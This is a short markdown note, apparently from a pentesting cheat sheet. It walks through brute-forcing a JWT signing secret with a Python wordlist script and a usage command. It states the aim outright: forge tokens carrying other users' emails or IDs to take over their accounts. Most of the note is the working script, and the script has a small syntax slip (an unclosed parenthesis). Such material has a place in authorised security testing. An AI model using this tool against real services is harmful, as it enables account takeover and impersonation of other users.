# JWT attack

* jwt brute force attack

## JWT Brute Force Attack

- [x] login to account
- [x] look for JWT token
- [x] bruteforce it with below python script for its secret key
- [x] command to use below code `python3 brute-jwt.py --file secrets.txt --
algorithm HS256 --token <TOKEN_VALUE_HERE>`
- [x] after successfully retrive the secret key than you can generate new jwt token with other user email address or user id and then you can do account takeover.

``` python
    #!/usr/bin/python

import sys
import jwt
import argparse
from termcolor import colored

parser = argparse.ArgumentParser(description='JWT',epilog='JWT'
parser.add_argument("--file",help="provide file input",dest='filename',required=True)
parser.add_argument("--token",help="provide token",dest='token',required=True)
parser.add_argument("--algorithm",help="provide algorithm",dest='algorithm',required=True)
args = parser.parse_args()

filename = args.filename
encoded = args.token
algorithm = args.algorithm

with open(filename) as secrets:
    for secret in secrets:
        try:
            payload = jwt.decode(encoded, secret.rstrip(), algorithms = [algorithm])
            print(colored('Success! Token decoded with ..... [' + secret.rstrip() + ']','green'))
            break
        except jwt.InvalidTokenError:
            print(colored('Invalid token .... [' + secret.rstrip() + ']', 'red'))
        except jwt.ExpiredSignatureError:
            print(colored('Token Expired ....[' + secret.rstrip() + ']','red'))


```
